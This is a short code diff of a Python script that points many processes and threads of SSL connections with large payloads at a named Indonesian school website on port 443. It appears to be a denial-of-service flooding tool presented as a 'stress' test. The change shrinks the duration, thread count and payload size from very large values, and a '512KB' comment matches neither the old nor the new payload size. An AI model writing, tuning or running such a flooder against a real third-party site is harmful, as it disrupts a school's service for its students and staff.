@@ -7,10 +7,10 @@ import os
 
 TARGET_HOST = "smansatugerokgak.sch.id"
 TARGET_PORT = 443
-DURATION = 30000000  # detik
-THREADS_PER_PROC = 7000
+DURATION = 3  # detik
+THREADS_PER_PROC = 7
 PROCESSES = multiprocessing.cpu_count() * 4
-PAYLOAD_SIZE = 1000 * 1024  # 512KB
+PAYLOAD_SIZE = 1 * 1024  # 512KB
 
 def stress_worker(payload_size, duration):
     context = ssl.create_default_context()
